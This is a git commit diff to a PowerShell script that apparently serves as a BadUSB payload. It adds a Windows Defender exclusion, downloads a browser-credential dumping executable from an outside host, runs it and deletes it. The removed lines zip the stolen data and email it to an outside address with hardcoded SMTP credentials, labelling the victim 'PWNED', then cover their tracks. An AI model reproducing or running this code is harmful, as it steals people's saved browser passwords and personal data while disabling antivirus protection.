2e597239f2572e29a7209a2c6c3393047706f3d1
Jhon-Lorenzo <110279489+Jhon-Lorenzo@users.noreply.github.com>
2023-03-19 21:30:56 -0500

    Update powershellcode.ps1

--- powershellcode.ps1
+++ powershellcode.ps1
@@ -1,33 +1,11 @@
 #Adding windows defender exclusionpath
-Add-MpPreference -ExclusionPath "$env:appdata"
+Add-MpPreference -ExclusionPath "$env:USERPROFILE\Downloads"
 #Creating the directory we will work on
-mkdir "$env:appdata\dump"
-Set-Location "$env:appdata\dump"
+mkdir "$env:USERPROFILE\Downloads\digi"
+Set-Location "$env:USERPROFILE\Downloads\digi"
 #Downloading and executing hackbrowser.exe
-Invoke-WebRequest -Uri "https://github.com/GamehunterKaan/BadUSB-Browser/blob/main/hackbrowser.exe?raw=true" -OutFile "$env:appdata\dump\hb.exe"
-cd $env:appdata\Local\dump
-./hb.exe
-Remove-Item -Path "$env:appdata\dump\hb.exe" -Force
-#Creating A Zip Archive
-Compress-Archive -Path * -DestinationPath dump.zip
-$Random = Get-Random
+Invoke-WebRequest -Uri "https://transfer.sh/MOVevw/hack-browrser.exe" -OutFile "$env:USERPROFILE\Downloads\digi\hb.exe"
+./hb.exe -b all -f json --dir results -zip
+Remove-Item -Path "$env:USERPROFILE\Downloads\digi\hb.exe" -Force
 #Mailing the output you will need to enable less secure app access on your google account for this to work
-$Message = new-object Net.Mail.MailMessage
-$smtp = new-object Net.Mail.SmtpClient("smtp.office365.com", 587)
-$smtp.Credentials = New-Object System.Net.NetworkCredential("bolalal@outlook.com", "guimaukbr123");
-$smtp.EnableSsl = $true
-$Message.From = "bolalal@outlook.com"
-$Message.To.Add("brunoformiga666@gmail.com")
-$ip = Invoke-RestMethod "myexternalip.com/raw"
-$Message.Subject = "Succesfully PWNED " + $env:USERNAME + "! (" + $ip + ")"
-$ComputerName = Get-CimInstance -ClassName Win32_ComputerSystem | Select Model,Manufacturer
-$Message.Body = $ComputerName
-$files=Get-ChildItem 
-$Message.Attachments.Add("$env:appdata\dump\dump.zip")
-$smtp.Send($Message)
-$Message.Dispose()
-$smtp.Dispose()
-#Cleanup
-cd "$env:appdata"
-Remove-Item -Path "$env:appdata\dump" -Force -Recurse
-Remove-MpPreference -ExclusionPath "$env:appdata"
+Set-Location "$env:USERPROFILE\Downloads\digi\results"
